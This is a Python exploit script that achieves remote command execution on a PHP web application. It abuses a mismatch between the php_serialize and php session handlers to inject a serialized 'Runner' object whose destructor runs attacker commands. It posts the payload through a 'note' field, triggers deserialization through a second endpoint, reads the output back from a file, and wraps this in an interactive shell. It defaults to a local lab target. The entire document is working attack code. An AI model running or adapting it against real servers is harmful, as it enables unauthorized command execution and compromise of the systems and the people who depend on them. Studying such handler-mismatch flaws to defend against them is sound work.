#!/usr/bin/env python3
"""
Command execution through the session handler MISMATCH (php_serialize writer,
php reader, application gadget). This is NOT CVE-2026-109618/109619: it needs
two handlers on one save_path and an app class with a dangerous destructor.
"""
import argparse, http.client, sys, time
from urllib.parse import urlencode

def payload(cmd):
    inner = 'O:6:"Runner":1:{s:3:"cmd";s:%d:"%s";}' % (len(cmd.encode()), cmd)
    return "x|" + inner

def req(host, port, path, body=None, sid=None):
    c = http.client.HTTPConnection(host, port, timeout=15)
    h = {"Cookie": "PHPSESSID=" + sid} if sid else {}
    if body is not None:
        h["Content-Type"] = "application/x-www-form-urlencoded"
        h["Content-Length"] = str(len(body))
    c.request("POST" if body is not None else "GET", path, body=body, headers=h)
    r = c.getresponse(); data = r.read(); hdrs = r.getheaders(); c.close()
    return r.status, hdrs, data

def cookie_sid(hdrs):
    for k, v in hdrs:
        if k.lower() == "set-cookie" and v.upper().startswith("PHPSESSID="):
            return v.split("=", 1)[1].split(";")[0]
    return None

def run(host, port, cmd):
    st, hdrs, _ = req(host, port, "/app/index.php")
    sid = cookie_sid(hdrs) or ("a" * 32)
    req(host, port, "/app/index.php", body=urlencode({"note": payload(cmd)}), sid=sid)
    req(host, port, "/api/index.php", sid=sid)
    time.sleep(0.1)
    st, hdrs, out = req(host, port, "/api/out.txt")
    return out.decode("utf-8", "replace").strip()

def main():
    p = argparse.ArgumentParser()
    p.add_argument("--target", default="http://127.0.0.1:18092")
    p.add_argument("-c", "--cmd")
    a = p.parse_args()
    host, _, port = a.target.replace("http://", "").partition(":")
    port = int(port or 80)
    if a.cmd:
        print(run(host, port, a.cmd)); return
    print("dummy lab shell - commands run via the handler mismatch, not the CVE")
    while True:
        try:
            cmd = input("cmd> ").strip()
        except (EOFError, KeyboardInterrupt):
            print(); break
        if not cmd: continue
        if cmd in ("exit", "quit"): break
        try:
            print(run(host, port, cmd))
        except Exception as exc:
            print("error:", exc)

if __name__ == "__main__":
    main()
